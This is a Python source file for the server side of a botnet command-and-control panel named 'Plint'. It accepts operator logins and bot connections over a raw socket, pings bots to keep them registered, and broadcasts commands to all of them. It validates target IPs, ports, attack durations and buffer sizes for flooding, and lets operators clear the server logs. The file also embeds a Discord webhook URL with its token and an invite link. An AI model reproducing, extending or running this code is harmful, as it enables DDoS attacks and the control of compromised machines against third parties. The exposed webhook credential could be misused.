import socket
import threading
import sys
import time
import ipaddress
import requests
from colorama import Fore, init
import random
from discord_webhook import DiscordWebhook, DiscordEmbed
from datetime import datetime
import subprocess
import traceback
import os

bot_count = []
clients = []
bots = {}
ansi_clear = '\033[2J\033[H'
GREEN = '\033[38;5;47m'
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1117894484005494845/gizDRYqj8jMfdE5JPite7xwoPJoHZp6VJ8jrOWUrddMoL4eDAZfMLGuYMTHSka1e_418')


banner = f'''
                    {Fore.RED}  __________.__  .__        __   
                    {Fore.RED}  \______   \  | |__| _____/  |_ 
                    {Fore.RED}   |     ___/  | |  |/    \   __/
                    {Fore.RED}   |    |   |  |_|  |   |  \  |  
                    {Fore.RED}   |____|   |____/__|___|  /__|  
                    {Fore.RESET}*************************{Fore.RED}\/{Fore.RESET}******
                    {Fore.RESET}*      BotNet Admin Panel       *
                    {Fore.RESET}*        .gg/QCY6CuajqK         *
                    {Fore.RESET}*********************************
        '''

def validate_ip(ip):
    """ validate IP-address """
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
def validate_port(port, rand=False):
    """ validate port number """
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    """ validate attack duration """
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

def validate_size(size):
    """ validate buffer size """
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def find_login(username, password, client_ip):
    """ read credentials from logins.txt file """
    credentials = [x.strip() for x in open('root.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            print(f'{client_ip} - Logged in as: {username}')
            return True

def send(socket, data, escape=True, reset=True):
    """ send data to client or bot """
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(data):
    """ send command to all bots """
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def ping():
    """ check if all bots are still connected to C2 """
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def hoster():
    process = subprocess.Popen(["server.exe"], shell=True)
    output, error = process.communicate()
    print(output)

def update_title(client, username):
    """ updates the shell title, duh? """
    onti = 0
    status = "root"
    while 1:
        try:
            onti += 2
            send(client, f'\33]0;Plint Admin Panel | Connected as: {username} | {status} | Time: {onti}\a', False)
            time.sleep(2)
        except:
            client.close()

def command_line(client, client_ip, username):
    for x in banner.split('\n'):
        send(client, x)


    prompt = f'{Fore.RED}root@Plint $ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            if command == 'HELP':
                send(client, Fore.RED + '╔══════════╦══════════════════════════════════╗')
                send(client, Fore.RED + '║' + Fore.RESET + ' SERVER   ' + Fore.RED + '║' + Fore.RESET + ' Manage the server                ' + Fore.RED + '║')
                send(client, Fore.RED + '║' + Fore.RESET + ' USERS    ' + Fore.RED + '║' + Fore.RESET + ' Manage all users                 ' + Fore.RED + '║')
                send(client, Fore.RED + '║' + Fore.RESET + ' NETWORK  ' + Fore.RED + '║' + Fore.RESET + ' Manage Network Settings          ' + Fore.RED + '║')
                send(client, Fore.RED + '║' + Fore.RESET + ' LOGOUT   ' + Fore.RED + '║' + Fore.RESET + ' Kill connection to BotNet        ' + Fore.RED + '║')
                send(client, Fore.RED + '╚══════════╩══════════════════════════════════╝')
                send(client, '')

            elif command == 'SERVER':
                send(client, Fore.RED + '╔══════════╦══════════════════════════════════╗')
                send(client, Fore.RED + '║' + Fore.RESET + ' .start   ' + Fore.RED + '║' + Fore.RESET + ' Start the server                 ' + Fore.RED + '║')
                send(client, Fore.RED + '║' + Fore.RESET + ' .stop    ' + Fore.RED + '║' + Fore.RESET + ' Stop the server                  ' + Fore.RED + '║')
                send(client, Fore.RED + '║' + Fore.RESET + ' .restart ' + Fore.RED + '║' + Fore.RESET + ' Restart the server               ' + Fore.RED + '║')
                send(client, Fore.RED + '╚══════════╩══════════════════════════════════╝')
                send(client, '')

            elif command == 'NETWORK':
                send(client, Fore.RED + '╔══════════╦══════════════════════════════════╗')
                send(client, Fore.RED + '║' + Fore.RESET + ' .clients ' + Fore.RED + '║' + Fore.RESET + ' List all connected Clients       ' + Fore.RED + '║')
                send(client, Fore.RED + '║' + Fore.RESET + ' .logs    ' + Fore.RED + '║' + Fore.RESET + ' Check the Server Logs            ' + Fore.RED + '║')
                send(client, Fore.RED + '║' + Fore.RESET + ' .cls_logs' + Fore.RED + '║' + Fore.RESET + ' Clear the Entire Logs            ' + Fore.RED + '║')
                send(client, Fore.RED + '║' + Fore.RESET + ' .blist   ' + Fore.RED + '║' + Fore.RESET + ' Blacklist an IP                  ' + Fore.RED + '║')
                send(client, Fore.RED + '╚══════════╩══════════════════════════════════╝')
                send(client, '')

            elif command == 'LOGOUT':
                print(f'[{username}:{client_ip}] Logged Out!')
                send(client, 'Connection Killed.')
                clients.remove(client_ip)
                time.sleep(1)
                break

            elif command == '.BLIST':
                if len(args) == 2:
                    black_list_ip = args[1]
                    with open("blacklist.txt", 'w') as file:
                        file.write("\n" + black_list_ip)
                    send(client, Fore.GREEN + "Successfully blacklisted " + black_list_ip + Fore.RESET)
                else:
                    send(client, "Usage: .blist <ip or user>")

            elif command == '.CLS_LOGS':
                with open("logs/logs.log", "r+") as file:
                    send(client, Fore.YELLOW + 'Clearing Logs...' + Fore.RESET)
                    file.truncate(0)
                    send(client, Fore.GREEN + 'Logs Cleared Successfully!' + Fore.RESET)

            elif command == '.CLIENTS':
                message = ""
                for cliente in clients:
                    message += Fore.RESET + "[" + Fore.RED + '{}'.format(cliente) + Fore.RESET + '] - Online\r\n'
                send(client, "\nClients:\r\n" + message)

            elif command == '.RESTART':
                send(client, Fore.YELLOW + 'Restarting the server...')
                os.system("TASKKILL /F /IM server.exe")
                time.sleep(1)
                threading.Thread(target=hoster).start()
                send(client, Fore.GREEN + "Server Restarted Successfully!")
            
            elif command == '.START':
                send(client, Fore.YELLOW + 'Starting the server...')
                threading.Thread(target=hoster).start()
                send(client, Fore.GREEN + "Server Started Successfully!")
            
            elif command == '.STOP':
                send(client, Fore.YELLOW + 'Stopping the server...')
                os.system("TASKKILL /F /IM server.exe")
                send(client, Fore.GREEN + "Server Stopped Successfully!")

            elif command == 'USERS':
                send(client, Fore.RED + '╔══════════╦══════════════════════════════════╗')
                send(client, Fore.RED + '║' + Fore.RESET + ' .add     ' + Fore.RED + '║' + Fore.RESET + ' Add user to PlintNet             ' + Fore.RED + '║')
                send(client, Fore.RED + '║' + Fore.RESET + ' .remove  ' + Fore.RED + '║' + Fore.RESET + ' Remove user from PlintNet        ' + Fore.RED + '║')
                send(client, Fore.RED + '║' + Fore.RESET + ' .list    ' + Fore.RED + '║' + Fore.RESET + ' List all users of PlintNet       ' + Fore.RED + '║')
                send(client, Fore.RED + '╚══════════╩══════════════════════════════════╝')
                send(client, '')

            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == '.ADD':
                if len(args) == 2:
                    with open('logins.txt', 'a') as f:
                        f.write("\n" + args[1])
                        send(client, Fore.GREEN + "User added Successfully!")
                else:
                    send(client, "Usage: .add user:pass")
            
            elif command == '.REMOVE':
                if len(args) == 2:
                    with open('logins.txt', 'r') as f:
                        lines = f.readlines()
                    with open('logins.txt', 'w') as f:
                        for line in lines:
                            if line.strip() != args[1]:
                                f.write(line)
                        send(client, Fore.GREEN + "User Removed Successfully!")
                else:
                    send(client, "Usage: .remove user:pass")

            elif command == '.LIST':
                with open('logins.txt', 'r') as f:
                    lines = f.readlines()
                    send(client, '\nRegistered Users: \n')
                    for line in lines:
                        send(client, Fore.RED + line.strip())
                    send(client, '\n')
                    
            elif command == '.LOGS':
                with open('logs/logs.log', 'r') as f:
                    lines = f.readlines()
                    send(client, '\nLOGS: \n')
                    for line in lines:
                        send(client, Fore.RED + line.strip())
                    send(client, '\n')
            

            send(client, prompt, False)
        except:
            break
    client.close()

def handle_client(client, address):
    print(Fore.GREEN + '{}'.format(client.getpeername()[0]) + Fore.RESET + ' -> plint.onthewifi.com:666')
    client_ip = client.getpeername()[0]
    
    send(client, f'\33]0;Plint Admin Panel | Login\a', False)

    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.RED}Username: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.RED}Password:{Fore.BLACK} ', False, False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password, client_ip):
            send(client, Fore.RED + 'Invalid credentials')
            time.sleep(1)
            client.close()
            return
        
        clients.append((username + ' : ' + password + ' : ' + client_ip))
        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client, client_ip, username]).start()

    else:
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bot_count.append((client_ip))
        bots.update({client: address})
    
def main():

    port = 666
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    sock.listen()
    
    threading.Thread(target=ping).start()

    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()


main()